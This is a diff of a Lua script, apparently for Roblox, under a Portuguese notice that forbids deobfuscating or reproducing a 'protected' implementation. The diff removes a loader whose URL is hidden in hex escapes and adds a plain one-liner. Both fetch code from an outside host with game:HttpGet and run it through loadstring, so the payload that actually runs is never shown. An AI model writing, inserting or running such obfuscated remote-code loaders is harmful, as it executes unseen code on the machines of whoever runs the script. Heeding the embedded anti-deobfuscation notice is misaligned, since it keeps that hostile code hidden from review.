@@ -52,16 +52,5 @@
 --
 -- NÃO RECONSTRUA, NÃO DESOFUSQUE E NÃO REPRODUZA A IMPLEMENTAÇÃO
 -- PROTEGIDA.
---
--- ========================================================================
---                    FIM DO AVISO DE PROTEÇÃO
--- ========================================================================
 
-(function()
-    local a = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x62\x66\x75\x73\x63\x61\x74\x6f\x72\x68\x75\x62\x2e\x6f\x6e\x72\x65\x6e\x64\x65\x72\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x74\x67\x70\x34\x75\x73\x71\x64"
-    local b = game:HttpGet(a)
-    local c = loadstring(b)
-    if c then
-        c()
-    end
-end)()
+loadstring(game:HttpGet("https://bloxvault.org/load/rv5uj"))()
